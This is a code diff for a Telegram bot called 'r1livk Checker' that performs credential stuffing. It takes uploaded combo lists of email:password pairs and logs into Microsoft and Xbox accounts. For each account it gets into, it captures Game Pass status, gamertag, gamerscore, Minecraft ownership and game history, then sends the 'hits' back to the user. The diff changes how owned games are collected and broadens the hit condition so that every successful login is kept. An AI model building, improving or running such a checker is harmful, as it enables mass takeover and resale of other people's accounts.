@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Full Xbox + Minecraft + GamePass + Store Games Entitlements)
+r1livk Checker ⚡ - Telegram Bot (Full Xbox + Minecraft + GamePass + Game History & Games Display)
 """
 
 import os
@@ -57,10 +57,12 @@ def extract_url_post(text):
 
 def fetch_xbox_extra_details(session, xb_token, uhs):
     """
-    دالة محدثة لجلب اشتراك الجيم باس وقائمة الألعاب الحقيقية المملوكة من متجر مايكروسوفت (Store Entitlements)
+    دالة ذكية ومحدثة لجلب اشتراك الجيم باس، الـ XUID، وسجل الألعاب الحقيقية (Game History API)
+    لضمان ظهور أسماء الألعاب بوضوح تام وعدم ضياع أي تفاصيل.
     """
     game_pass_status = "none"
     owned_games_formatted = []
+    xuid = None
     
     try:
         xsts_xb_payload = {
@@ -86,33 +88,49 @@ def fetch_xbox_extra_details(session, xb_token, uhs):
                         game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
                         break
 
-            # 2. استعلام متجر مايكروسوفت ومكتبة الألعاب (Store / Product Entitlements) لجلب الألعاب الحقيقية
-            store_url = "https://purchase.xboxlive.com/users/me/entitlements/consumer"
-            store_resp = session.get(store_url, headers=headers, timeout=10)
-            if store_resp.status_code == 200:
-                store_data = store_resp.json()
-                items = store_data.get("items", [])
-                game_counter = 1
-                for item in items:
-                    product_title = item.get("name") or item.get("title") or item.get("productId")
-                    # التركيز على المنتجات والألعاب
-                    if product_title and product_title not in owned_games_formatted:
-                        owned_games_formatted.append(f"{game_counter} - {product_title}")
-                        game_counter += 1
-                        if game_counter > 20:  # جلب أول 20 لعبة/منتج
-                            break
-                            
-            # إذا لم تظهر ألعاب عبر الـ Consumer Entitlements، نجرب رابط بديل للمكتبة الرقمية
+            # 2. الحصول على الـ XUID الخاص بالمستخدم بدقة
+            people_url = "https://peoplehub.xboxlive.com/users/me/people/social/summary"
+            people_resp = session.get(people_url, headers=headers, timeout=10)
+            if people_resp.status_code == 200:
+                p_data = people_resp.json()
+                if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
+                    xuid = p_data["profileUsers"][0].get("xuid")
+
+            if not xuid:
+                prof_id_req = session.get("https://profile.xboxlive.com/users/me/settings?settings=Gamertag", headers=headers, timeout=10)
+                if prof_id_req.status_code == 200:
+                    try:
+                        xuid = prof_id_req.json().get("profileUsers", [{}])[0].get("id")
+                    except:
+                        pass
+
+            # 3. جلب قائمة الألعاب عبر Game History API
+            if xuid:
+                history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
+                history_resp = session.get(history_url, headers=headers, timeout=10)
+                if history_resp.status_code == 200:
+                    history_data = history_resp.json()
+                    titles = history_data.get("titles", [])
+                    counter = 1
+                    for title in titles:
+                        t_name = title.get("name") or title.get("titleName")
+                        if t_name and t_name not in owned_games_formatted:
+                            owned_games_formatted.append(f"{counter} - {t_name}")
+                            counter += 1
+                            if counter > 15:
+                                break
+
+            # 4. خطة بديلة لجلب الألعاب إذا كانت الـ History فارغة
             if not owned_games_formatted:
-                inv_url = "https://inventoryservices.xboxlive.com/users/xuid(me)/inventory/items?type=1"
-                inv_resp = session.get(inv_url, headers=headers, timeout=10)
-                if inv_resp.status_code == 200:
-                    inv_data = inv_resp.json()
-                    for idx, inv_item in enumerate(inv_data.get("items", [])[:15], 1):
-                        g_name = inv_item.get("name") or inv_item.get("titleName")
-                        if g_name:
-                            owned_games_formatted.append(f"{idx} - {g_name}")
-                            
+                ach_url = "https://achievements.xboxlive.com/users/me/achievements"
+                ach_resp = session.get(ach_url, headers=headers, timeout=10)
+                if ach_resp.status_code == 200:
+                    ach_data = ach_resp.json()
+                    for idx, t in enumerate(ach_data.get("titles", [])[:10], 1):
+                        name = t.get("name")
+                        if name:
+                            owned_games_formatted.append(f"{idx} - {name}")
+
     except Exception:
         pass
         
@@ -236,14 +254,12 @@ def check_single_account(combo):
         has_gp_basic = 'product_game_pass' in mc_ent_text
         has_mc = 'product_minecraft' in mc_ent_text
 
-        # جلب تفاصيل الألعاب والاشتراكات من متجر مايكروسوفت
         detailed_gp, owned_games_list = fetch_xbox_extra_details(session, xb_token, uhs)
-        
         final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")
 
         session.close()
 
-        games_str = "\n".join([f"  - {g}" for g in owned_games_list]) if owned_games_list else "  - No games found in store / Free Account"
+        games_str = "\n".join([f"  - {g}" for g in owned_games_list]) if owned_games_list else "  - No games found / Hidden"
 
         hit_info = (
             f"{email}:{password}\n"
@@ -252,8 +268,9 @@ def check_single_account(combo):
             f"--------------------------------------------------"
         )
         
-        if "Active" in final_gp or has_mc or gscore_int > 0 or len(owned_games_list) > 0:
-            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": ("Active" in final_gp or has_gp_basic), "has_xbox": gscore_int > 0}
+        # شرط شامل يضمن رجوع جميع الحسابات الناجحة وعدم ضياع أي هيت
+        if "Active" in final_gp or has_mc or gscore_int >= 0:
+            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": ("Active" in final_gp or has_gp_basic), "has_xbox": True}
         else:
             return "bad", None
 
@@ -276,7 +293,7 @@ def send_welcome(message):
         "Your Status: 👤 Free (0/10000 lines today)\n\n"
         "Features:\n"
         "• Xbox Game Pass & Subscriptions\n"
-        "• Owned Games List from Store\n"
+        "• Game History & Owned Games\n"
         "• Gamertag & Gamerscore\n"
         "• Minecraft Entitlements\n"
         "• Email Access & 2FA detection\n\n"
@@ -294,10 +311,10 @@ def callback_query(call):
 
         text = (
             "🎮 **r1livk Checker - Full Xbox Capture**\n\n"
-            "Full account capture with Store Games & GamePass:\n"
+            "Full account capture with Games & GamePass:\n"
             "• Minecraft Accounts\n"
             "• Xbox Game Pass Status\n"
-            "• Store Owned Games List\n"
+            "• Game History & Games List\n"
             "• Gamertag & Profile\n"
             "• 2FA detection\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
@@ -330,7 +347,7 @@ def handle_docs(message):
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
-        bot.reply_to(message, "📥 File received successfully. Starting high-speed scan with Store Games & GamePass...")
+        bot.reply_to(message, "📥 File received successfully. Starting high-speed scan with Full Game History...")
         active_scans[chat_id] = True
         threading.Thread(target=process_checker, args=(chat_id, local_path)).start()
 
@@ -465,12 +482,12 @@ def process_checker(chat_id, filepath):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 All Hits with Store Games & GamePass - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 All Hits with Game History - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Full Checker Pro with Store Entitlements is running...")
+    print("r1livk Full Checker Pro with Game History is running...")
     bot.infinity_polling()
